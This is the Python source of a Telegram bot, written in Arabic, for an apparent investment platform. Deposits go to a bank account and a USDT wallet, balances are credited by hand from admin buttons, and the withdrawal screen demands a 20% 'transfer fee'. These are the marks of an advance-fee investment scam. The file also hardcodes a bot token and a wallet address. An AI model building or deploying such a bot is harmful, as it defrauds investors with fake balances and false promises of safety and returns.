import logging, os, sqlite3
from flask import Flask
from threading import Thread
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# --- 🌐 خادم الويب (لضمان بقاء السيرفر حياً 24 ساعة) ---
app_web = Flask('')
@app_web.route('/')
def home(): return "🚀 Sahm Platform - Final Stable Version"

def run_server():
    app_web.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))

# إعداد السجلات لمراقبة الأداء
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# ================= [ ⚙️ إعدادات الإمبراطور الثابتة ] =================
TOKEN = '8731999916:AAHdeigVSmil8KD6GeA7OazVZkjVxhq9QJU'
ADMIN_USERNAME = 'HCICICVICIF9'
ADMINS_LIST = [6016547718]

# 🏦 عناوين البنوك والمحافظ (تظهر للمستثمر)
BANK_ACCOUNT = "SA0000000000000000000000" # ضع رقم حسابك البنكي هنا
CRYPTO_WALLET = "TLtLuhkU2kkkR1Wz1TtrBTpoNRTNviYpsA" # عنوان USDT (TRC20)

# ===============================================================

# --- 🗄️ إدارة قاعدة البيانات المحلية (SQLite) لضمان عدم ضياع الأموال ---
def init_db():
    conn = sqlite3.connect('sahm_v3_stable.db', check_same_thread=False)
    conn.execute('''CREATE TABLE IF NOT EXISTS users (
                    uid INTEGER PRIMARY KEY, 
                    bal_sar REAL DEFAULT 0.0, 
                    bal_usd REAL DEFAULT 0.0)''')
    conn.commit()
    return conn

db_conn = init_db()

def get_user_data(uid):
    cursor = db_conn.cursor()
    cursor.execute('SELECT bal_sar, bal_usd FROM users WHERE uid = ?', (uid,))
    row = cursor.fetchone()
    if not row:
        cursor.execute('INSERT INTO users (uid, bal_sar, bal_usd) VALUES (?, 0.0, 0.0)', (uid,))
        db_conn.commit()
        return {"bal_sar": 0.0, "bal_usd": 0.0}
    return {"bal_sar": row[0], "bal_usd": row[1]}

def update_balance(uid, curr, amt):
    cursor = db_conn.cursor()
    field = "bal_sar" if curr == 'sr' else "bal_usd"
    cursor.execute(f'UPDATE users SET {field} = {field} + ? WHERE uid = ?', (float(amt), int(uid)))
    db_conn.commit()

# --- 🏠 دالة البداية (Start) برسالة ترحيبية قوية ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    get_user_data(user.id)
    
    keyboard = [
        [InlineKeyboardButton("🇸🇦 استثمار (بالريال السعودي)", callback_data='c_sr'),
         InlineKeyboardButton("🇺🇸 استثمار (بالدولار)", callback_data='c_us')],
        [InlineKeyboardButton("🌍 الاستثمار بعملات أخرى", callback_data='other_currency')],
        [InlineKeyboardButton("💰 محفظتي المالية", callback_data='wallet')],
        [InlineKeyboardButton("📤 طلب سحب الأرباح", callback_data='withdraw')],
        [InlineKeyboardButton("💬 التواصل مع الإدارة", url=f"https://t.me/{ADMIN_USERNAME}")]
    ]
    
    welcome_text = (
        f"🏦 **مرحباً بكم في شركة الاولى العالمية للاستثمار**\n\n"
        f"السيد: **{user.first_name}**\n\n"
        f"أهلاً بك في منصتنا الرائدة عالمياً. نحن هنا لنصنع مستقبلك المالي "
        f"بأمان تام وعوائد مجزية. انطلق الآن في عالم الاستثمار الاحترافي "
        f"مع نخبة من الخبراء في خدمتك على مدار الساعة.\n\n"
        f"💡 **يرجى اختيار القسم المطلوب للبدء:**"
    )
    
    if update.message:
        await update.message.reply_text(welcome_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
    elif update.callback_query:
        await update.callback_query.edit_message_text(welcome_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

# --- 🔘 معالج الأزرار الشامل ---
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data
    uid = query.from_user.id
    await query.answer()

    if data == 'main': 
        await start(update, context)
    
    elif data == 'other_currency':
        text = "🌍 **الاستثمار بالعملات الدولية:**\n\nيرجى التواصل مع الدعم الفني للحصول على حساباتنا البنكية الرسمية المتاحة في أي دولة حول العالم.\n\nنحن نوفر لك حلولاً مالية عابرة للحدود."
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data='main')]]), parse_mode='Markdown')

    elif data == 'wallet':
        u = get_user_data(uid)
        text = (f"📊 **تفاصيل محفظتك المالية:**\n\n"
                f"🇸🇦 ريال سعودي: `{u['bal_sar']:,}`\n"
                f"🇺🇸 دولار أمريكي: `{u['bal_usd']:,}`\n\n"
                f"🛡️ أموالك في أمان تام وتخضع لأعلى معايير الحماية.")
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data='main')]]), parse_mode='Markdown')
    
    elif data == 'withdraw':
        u = get_user_data(uid)
        msg = (f"📤 **إجراءات سحب الأرباح:**\n\n"
               f"رصيدك المتاح حالياً:\n"
               f"🇸🇦: `{u['bal_sar']}` ريال\n"
               f"🇺🇸: `{u['bal_usd']}` دولار\n\n"
               f"⚠️ **تنبيه:** يرجى سداد رسوم (20%) لفتح بوابة التحويل الدولي لضمان وصول أموالك لمحفظتك الخارجية.")
        await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data='main')]]), parse_mode='Markdown')

    elif data in ['c_sr', 'c_us']:
        curr = 'sr' if data == 'c_sr' else 'us'
        prices = ["1000", "2000", "5000", "10000", "20000", "50000"] if curr == 'sr' else ["300", "500", "1000", "2000", "5000", "10000"]
        btns = [[InlineKeyboardButton(f"{p} {('﷼' if curr=='sr' else '$')}", callback_data=f"{curr[0]}_{p}") for p in prices[i:i+2]] for i in range(0, len(prices), 2)]
        btns.append([InlineKeyboardButton("🔙 رجوع", callback_data='main')])
        await query.edit_message_text("🏦 **يرجى اختيار مبلغ الاستثمار المطلوب:**", reply_markup=InlineKeyboardMarkup(btns), parse_mode='Markdown')

    elif data.startswith(('s_', 'u_')):
        amt = data.split('_')[1]
        is_sar = data.startswith('s_')
        addr = BANK_ACCOUNT if is_sar else CRYPTO_WALLET
        text = (f"✅ تم اختيار مبلغ الاستثمار: **{amt}** " + ("ريال" if is_sar else "دولار") + "\n\n"
                f"يرجى التحويل إلى العنوان التالي:\n"
                f"`{addr}`\n\n"
                f"📸 **هام:** بعد التحويل، يرجى إرسال صورة إيصال الدفع هنا ليتم التحقق وإضافة المبلغ لمحفظتك فوراً.")
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data='main')]]), parse_mode='Markdown')

    # --- 🛠️ أزرار المالك (ثابتة للإيداع المتكرر والسرعة) ---
    elif data.startswith('ok_'):
        if uid not in ADMINS_LIST: return
        try:
            _, cur, val, tid = data.split('_')
            update_balance(tid, cur, val)
            await query.answer(f"✅ تم بنجاح إضافة {val} {cur}", show_alert=False)
            # إشعار العميل
            await context.bot.send_message(chat_id=int(tid), text=f"🎉 **أبشر.. تم إيداع مبلغ `{val}` {('ريال' if cur=='sr' else 'دولار')} في محفظتك بنجاح!**", parse_mode='Markdown')
        except Exception as e:
            logger.error(f"Error updating: {e}")
            await query.answer("❌ خطأ في تحديث البيانات")
            
    elif data == 'delete_msg':
        if uid in ADMINS_LIST:
            await query.message.delete()

# --- 📸 معالج الصور (إدارة الإيصالات) ---
async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if update.message.photo:
        await update.message.reply_text("✅ **تم استلام الإيصال، جاري المراجعة والتحقق من قبل الإدارة...**", parse_mode='Markdown')
        
        # أزرار الإضافة السريعة للمالك
        def b(v, c): return InlineKeyboardButton(f"➕ {v} {('ر' if c=='sr' else '$')}", callback_data=f"ok_{c}_{v}_{user.id}")
        
        kb = [
            [b("1000", "sr"), b("2000", "sr"), b("5000", "sr")],
            [b("10000", "sr"), b("20000", "sr"), b("50000", "sr")],
            [b("100", "us"), b("500", "us"), b("1000", "us")],
            [b("2000", "us"), b("5000", "us"), b("10000", "us")],
            [InlineKeyboardButton("❌ إغلاق / رفض الإيصال", callback_data='delete_msg')]
        ]
        
        for adm in ADMINS_LIST:
            try:
                await context.bot.send_photo(chat_id=adm, photo=update.message.photo[-1].file_id, 
                                           caption=f"🔔 **إشعار إيداع جديد:**\nالاسم: {user.first_name}\nID: `{user.id}`\n\n(الأزرار ثابتة لتتمكن من إضافة مبالغ متعددة)", 
                                           reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')
            except: pass

# --- 🚀 الانطلاق النهائي ---
if __name__ == '__main__':
    Thread(target=run_server, daemon=True).start()
    app = Application.builder().token(TOKEN).build()
    
    app.add_handler(CommandHandler('start', start))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    
    logger.info("🚀 تم تشغيل المنصة بنجاح - الذاكرة المستقرة مفعلة")
    app.run_polling(drop_pending_updates=True)
